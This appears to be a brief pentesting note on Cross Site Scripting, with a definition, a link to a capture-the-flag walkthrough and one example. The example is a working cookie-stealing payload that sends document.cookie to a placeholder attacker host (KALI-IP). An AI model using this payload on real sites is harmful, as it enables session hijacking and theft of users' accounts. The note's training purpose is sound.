
Cross Site Scripting (XSS) is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts into a legitimate website or web application, which can then be executed by unsuspecting users. 

XSS attacks can be used to steal sensitive information, such as login credentials or personal data, from users who visit the compromised site. They can also be used to deface websites, redirect users to malicious sites, or perform other malicious activities.


# Guide

# Walkthrough

[HTB: Holiday | 0xdf hacks stuff](https://0xdf.gitlab.io/2019/09/11/htb-holiday.html)

# Examples

## Stealing Cookies

```
<html>
<body>
<script>
var r = new XMLHttpRequest();
r.open("GET", "http://KALI-IP/" + document.cookie);
r.send();
</script>
</body>
</html>
```

Sending this HTML to the website which will display it will steal the cookie from any user who views it.